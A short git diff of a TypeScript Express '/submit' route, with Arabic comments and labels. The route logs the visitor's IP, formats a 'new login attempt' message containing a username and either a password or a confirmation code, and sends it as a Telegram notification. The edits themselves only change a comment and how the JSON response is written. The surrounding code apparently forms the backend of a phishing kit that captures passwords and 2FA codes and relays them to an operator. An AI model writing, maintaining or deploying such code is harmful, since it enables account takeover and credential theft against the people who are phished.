@@ -36,7 +36,7 @@ router.post("/submit", async (req: Request, res: Response) => {
     const ip = req.headers['x-forwarded-for'] || req.ip || 'غير معروف';
     console.log('📥 [9] IP:', ip);
 
-    // بناء الرسالة بدون Markdown
+    // بناء الرسالة
     const isCode = username === "🔐 رمز التأكيد";
     const title = isCode ? "🔐 رمز التأكيد" : "🔐 محاولة دخول جديدة";
     const label = isCode ? "📱 رمز التأكيد:" : "🔑 كلمة المرور:";
@@ -75,7 +75,10 @@ ${label} ${password}
     }
 
     console.log("📥 [14] ✅ Telegram notification sent for:", username);
-    res.status(200).json({ success: true });
+    
+    // ✅ تعديل الرد ليكون JSON صحيح
+    res.setHeader('Content-Type', 'application/json');
+    res.status(200).send(JSON.stringify({ success: true }));
 
   } catch (error) {
     console.error("📥 [15] ❌ Telegram alert error:", error);
